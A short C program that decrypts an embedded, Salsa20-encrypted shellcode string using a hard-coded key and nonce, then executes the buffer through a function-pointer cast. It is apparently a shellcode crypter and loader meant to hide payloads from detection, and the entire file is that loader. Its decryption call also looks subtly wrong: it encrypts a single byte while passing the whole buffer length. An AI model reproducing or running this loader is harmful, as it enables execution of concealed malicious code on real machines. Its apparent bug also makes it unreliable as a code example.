#include <stdio.h>
#include <string.h>
#include "salsa20.h"

int main(int argc, char *argv[]) {
  	char in[]= "\xb3\x84\xcb\x15\x17\xfb\xd1\x98\x0f\xb0\xa9\x81\xe5\x66\xde\x28\x49\xc7\x7e\x3b\xb0\x66\x06\x65\x52";
	char key[] = "qwertyuiolkjhgfd";
	char nonce[] = "wderftgy";
  	// Stream index
	uint32_t si = 0;
	int in_len = strlen(in);
	int count;
	int (*ret)() = (int(*)())in;
	printf("Decrypting Shellcode...\n\n\"");
	for (count=0; count < in_len; count++) {
		uint8_t c = in[count];
    	// Encrypt a single character at a time
    	//                          key     128-bit key                 nonce  encrypt one byte
    	if (s20_crypt((uint8_t *) key, S20_KEYLEN_128, (uint8_t *) nonce, si++, &c, in_len) == S20_FAILURE)
      	    puts("Error: Decryption failed");
		//printf("\\x%02x", c);
		in[count] =  (char) c;
		
    }
	ret();
	printf("\"\n\n");
  return 0;
}
